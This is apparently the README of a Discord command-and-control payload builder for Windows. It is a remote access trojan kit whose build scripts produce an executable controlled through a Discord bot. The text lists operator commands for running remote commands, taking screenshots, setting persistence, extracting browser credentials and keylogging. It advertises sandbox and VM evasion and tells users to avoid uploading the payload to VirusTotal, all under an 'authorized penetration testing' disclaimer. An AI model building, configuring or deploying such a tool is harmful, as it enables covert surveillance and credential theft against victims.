# Discord C2 Payload Builder for Windows

A streamlined Discord C2 payload builder designed specifically for Windows Server 2019 and modern Windows environments.

## Features

- **Discord C2 Communication**: Full Discord bot integration for command and control
- **Modern Dependencies**: Updated to use latest Python packages
- **UV Package Manager**: Fast, reliable dependency management
- **Single Batch Script**: Simple one-click build process
- **Windows Optimized**: Designed specifically for Windows environments
- **Stealth Features**: Sandbox evasion and VM detection

## Prerequisites

### Required Software

1. **Python 3.9+**: Download from [python.org](https://www.python.org/downloads/)
2. **UV Package Manager**: Install from [docs.astral.sh/uv](https://docs.astral.sh/uv/getting-started/installation/)

### Quick UV Installation
```cmd
# Using PowerShell (Recommended)
powershell -c "irm https://astral.sh/uv/install.ps1 | iex"

# Or using pip
pip install uv
```

### Discord Bot Setup

1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
2. Create a new application
3. Go to "Bot" section and create a bot
4. Copy the bot token
5. Invite bot to your server with appropriate permissions
6. Get your Guild ID and Channel ID

## Quick Start

### Method 1: Quick Build (Recommended)

**Fastest option** - Uses pre-configured defaults:
```cmd
quick_build.bat
```

This will automatically:
- Install UV package manager if needed
- Set up virtual environment
- Install all dependencies
- Build `d3.exe` with default configuration

### Method 2: Complete Build (Interactive)

**Full control** - Choose your own settings:
```cmd
build_complete.bat
```

This will:
- Set up environment automatically
- Prompt for configuration (or use defaults)
- Build with your custom settings

### Method 3: Config File Build

1. Edit `config.json` with your settings:
   ```json
   {
       "payload_name": "d3",
       "guild_id": "1375935187250057216",
       "bot_token": "MTM37NTkzNTQ5OTU0OTU0MDM3Mg...",
       "channel_id": "1375935188265209989",
       "keylogger_webhook": "https://discord.com/api/webhooks/..."
   }
   ```

2. Run the config-based build:
   ```cmd
   build_from_config.bat
   ```

## Output

The build process will create:
- `dist/[payload_name].exe` - The final executable payload
- Temporary files are automatically cleaned up

## Debug Mode

### Testing and Verification

For testing and verifying functional deployment, run the payload with debug mode:

```cmd
d3.exe -d
```

**Debug Mode Features:**
- ✅ **Terminal Logs** - Real-time logging of all operations
- ✅ **Debug Hit** - Sends test message to Discord server
- ✅ **System Information** - Shows detailed system info in Discord
- ✅ **Evasion Bypass** - Runs regardless of sandbox/VM detection
- ✅ **Debug Log File** - Creates `debug.log` for troubleshooting
- ✅ **Connection Verification** - Confirms Discord bot connectivity

**Debug Output Example:**
```
============================================================
DEBUG MODE ENABLED
============================================================
Bot Token: MTM37NTkzNTQ5OTU0OTU0...
Guild ID: 1375935187250057216
Channel ID: 1375935188265209989
Webhook: https://discord.com/api/webhooks/1375937047998501057/...
============================================================
[14:32:15] DEBUG: Starting payload in DEBUG MODE
[14:32:15] DEBUG: Performing system checks...
[14:32:16] DEBUG: Sending debug hit to Discord server...
[14:32:17] DEBUG: Debug bot connected as YourBot#1234
[14:32:18] DEBUG: Debug hit sent successfully!
[14:32:18] DEBUG: Sandbox evasion test: PASSED
[14:32:18] DEBUG: VM detection test: PHYSICAL MACHINE
[14:32:19] DEBUG: Starting Discord bot...
[14:32:20] DEBUG: Bot connected as YourBot#1234
[14:32:20] DEBUG: Channel obtained: #your-channel
[14:32:21] DEBUG: Agent ID: 1337, Config created: True
[14:32:22] DEBUG: Agent online message sent
```

## Discord Bot Commands

Once the payload is running, you can use these Discord commands:

### Basic Commands
- `/interact <id>` - Interact with a specific agent
- `/ls` - List all active agents (use `!ls` not `/ls`)
- `/cmd <command>` - Execute system commands
- `/screenshot` - Take a screenshot
- `/terminate` - Terminate the agent

### Advanced Commands
- `/persistent` - Enable persistence on target
- `/creds` - Extract saved browser credentials
- `/process` - List running processes
- `/keylog <mode> <interval>` - Start/stop keylogger

### Interactive Buttons
When listing agents with `!ls`, you'll get interactive buttons for:
- Quick interaction
- Screenshot capture
- Process listing
- Credential extraction
- Termination

## Security Features

### Sandbox Evasion
- VM detection (VirtualBox, VMware, etc.)
- Process monitoring for analysis tools
- Disk size verification
- Mouse click tracking

### Stealth Operations
- Hidden configuration directories
- Registry persistence
- Temporary file cleanup
- Error handling and logging

## Important Security Notes

⚠️ **WARNING**: This tool is for authorized penetration testing only!

- **DO NOT** upload to VirusTotal or similar services
- Test in isolated environments first
- Ensure you have proper authorization
- Use only for legitimate security testing
- Follow responsible disclosure practices

## Troubleshooting

### Common Issues

1. **UV not found**: Install UV package manager
2. **Python not found**: Install Python 3.9+
3. **Build fails**: Check dependencies and permissions
4. **Bot doesn't connect**: Verify token and permissions

### Dependencies

The payload uses these modern packages:
- `discord.py>=2.3.2` - Discord API wrapper
- `requests>=2.31.0` - HTTP requests
- `opencv-python>=4.8.1` - Computer vision
- `pyautogui>=0.9.54` - GUI automation
- `sounddevice>=0.4.6` - Audio recording
- `keyboard>=0.13.5` - Keylogging
- `psutil>=5.9.6` - System information
- `pywin32>=306` - Windows API
- `pycryptodome>=3.19.0` - Cryptography

## File Structure

```
├── discord_payload.py      # Main payload template
├── build.bat              # Interactive build script
├── build_from_config.bat  # Config-based build script
├── config.json           # Configuration template
├── pyproject.toml        # UV project configuration
├── libraries/            # Core functionality modules
│   ├── disctopia.py     # Main functions
│   ├── credentials.py   # Credential extraction
│   ├── keylogger.py     # Keylogging functionality
│   └── sandboxevasion.py # Evasion techniques
└── img/
    └── exe_file.ico     # Executable icon
```

## Legal Disclaimer

This software is provided for educational and authorized penetration testing purposes only. Users are responsible for complying with all applicable laws and regulations. The authors are not responsible for any misuse of this software.
